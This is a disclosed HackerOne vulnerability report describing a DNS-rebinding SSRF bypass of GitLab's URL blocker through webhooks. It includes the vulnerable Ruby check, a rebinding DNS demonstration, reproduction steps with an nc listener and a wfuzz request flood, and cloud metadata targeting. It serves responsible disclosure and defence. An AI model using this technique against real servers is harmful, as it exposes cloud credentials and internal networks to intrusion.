# GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery

## Report Details
- **Report ID**: 541169
- **URL**: https://hackerone.com/reports/541169
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-04-17T09:18:36.964Z
- **Disclosed**: 2019-12-12T11:56:05.168Z

## Reporter
- **Username**: ajxchapman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
The `GitLab::UrlBlocker` IP address validation methods suffer from a Time of Check to Time of Use (ToCToU) vulnerability. The vulnerability occurs due to multiple DNS resolution requests performed before and after the checks. This issue allows a malicious authenticated user to send GET and POST HTTP requests to arbitrary hosts, including the localhost, cloud metadata services and the local network, and read the HTTP response.

### Details
The IP address validation code in `/lib/gitlab/url_blocker.rb` resolves the IP addresses of the provided URL domain, raises an exception if the resolved IP addresses match addresses in block lists (`127.0.0.1`, `::1`, `169.254.0.0/16`, etc.) or returns `true` if the IP address do not match the block lists.
```ruby
  begin
    addrs_info = Addrinfo.getaddrinfo(uri.hostname, port, nil, :STREAM).map do |addr|
      addr.ipv6_v4mapped? ? addr.ipv6_to_ipv4 : addr
    end
  rescue SocketError
    return true
  end

  validate_localhost!(addrs_info) unless allow_localhost
  validate_loopback!(addrs_info) unless allow_localhost
  validate_local_network!(addrs_info) unless allow_local_network
  validate_link_local!(addrs_info) unless allow_local_network

  true
end
```
If the address validates the `GitLab::HTTP` code then uses `HTTParty` to request the URL, which performs a second URL domain DNS resolution. The address validation checks can be bypassed if the URL domain resolves to a valid address for the first resolution then a forbidden address after the checks are performed. 

In order to perform this attack a DNS server must be configured to resolve a domain to alternating addresses with a low (or zero) Time To Live. To demonstrate this issue I used my researchersservers project (https://github.com/ajxchapman/sshreverseshell) with the configuration in {F470655}. Output of resolving `gitlabextssrf.webhooks.pw` against this DNS resolver configuration is shown below:
```sh
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
```
Notice the alternating resolved IP address and 0 ttl.

### Attack scenario
Using the Web Hook integration functionality of a GitLab repository, this issue can be abused to send HTTP GET and POST requests to arbitrary IP addresses, with arbitrary path parameters. The following screenshot shows the response of an HTTP GET request to `http://169.254.169.254/metadata/v1.json` on a DigitalOcean droplet:
{F470641}

### Steps to reproduce
To demonstrate this issue I have configured the domain `gitladextssrf.webhooks.pw` to randomly resolve to either `198.211.125.160` or `127.0.0.1`.

1. Create a new repository
1. Add a commit to the repository
1. Create a new Web Hook integration with the URL http://gitlabextssrf.webhooks.pw:9999.
  * This may take several attempts due to the random nature of the `gitlabextssrf.webhooks.pw` DNS resolver, if it fails with a `500` error, try again until it is accepted.
1. Log into the gitlab server and start a TCP listener on port 9999/tcp (e.g. `nc -vvn -l -p 9999`)
1. Perform numerous parallel requests to the Web Hook test endpoint. For this I use `wfuzz`

```sh
$ ./wfuzz -X POST \
  -b "_gitlab_session=<session_id>;" \
  -d "_method=post&authenticity_token=<token>" \
  -z range,0-1000 \
  "https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ"
```
The the below video demonstration of reproducing this issue:
{F470642}

After several requests a connection will be made to the local TCP listener on port 9999/tcp.

### Impact
This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.

### What is the current *bug* behavior?
The `GitLab::UrlBlocker` validation code resolves the IP addresses of a URL domain, validates them against a series of block lists, and if valid returns to the `GitLab::HTTP` module which re-resolves the URL domain in order to perform the HTTP request.

### What is the expected *correct* behavior?
The validated resolved addresses should be returned by `GitLab::UrlBlocker` and used by `GitLab::HTTP` to make the TCP connection to the destination host.

### Relevant logs and/or screenshots
Output of using the ToCToU bypass in a Web Hook to send a request to the DigitalOcean droplet meta data API `http://169.254.169.254/metadata/v1.json` endpoint:
{F470641}

### Output of checks
#### Results of GitLab environment info
```sh
$ gitlab-rake gitlab:env:info

System information
System:         Ubuntu 18.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.5.3p105
Gem Version:    2.7.6
Bundler Version:1.16.6
Rake Version:   12.3.2
Redis Version:  3.2.12
Git Version:    2.18.1
Sidekiq Version:5.2.5
Go Version:     unknown

GitLab information
Version:        11.9.8-ee
Revision:       c9701808101
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     postgresql
DB Version:     9.6.11
URL:            https://gitlabext.webhooks.pw
HTTP Clone URL: https://gitlabext.webhooks.pw/some-group/some-project.git
SSH Clone URL:  git@gitlabext.webhooks.pw:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        8.7.1
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

I have confirmed this issue on both the official Docker image and the official `gitlab-ee` Ubuntu package (using installation instructions from https://about.gitlab.com/install/#ubuntu).

## Impact

This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.

## Attachments
- Screenshot_from_2019-04-17_09-18-49.png
- gitlab_ssrf.mp4
- 41_gitlab.json
